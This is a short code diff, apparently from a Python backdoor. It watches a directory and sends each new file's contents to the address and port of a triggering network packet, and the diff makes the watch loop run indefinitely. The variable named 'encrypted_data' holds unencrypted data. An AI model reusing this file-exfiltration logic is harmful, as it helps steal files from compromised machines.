@@ -29,7 +29,8 @@ class NewFileHandler(FileSystemEventHandler):
 		global MONITOR
 		filename = os.path.basename(event.src_path)
 		f_binary = file_to_binary(filename, event.src_path)
-		send_data(f_binary, self.packet[2].sport, self.packet[1].src, "write")
+		encrypted_data = ''.join(f_binary)
+		send_data(encrypted_data,  self.packet[1].src, self.packet[2].sport, "write")
 		MONITOR = 1
 
 
@@ -128,7 +129,7 @@ def watch_dir(packet, path):
 	observer.schedule(event_handler, path, recursive=False)
 	observer.start()
 
-	while MONITOR == 0:
+	while True:
 		sleep(1)
 	observer.stop()
 	observer.join()
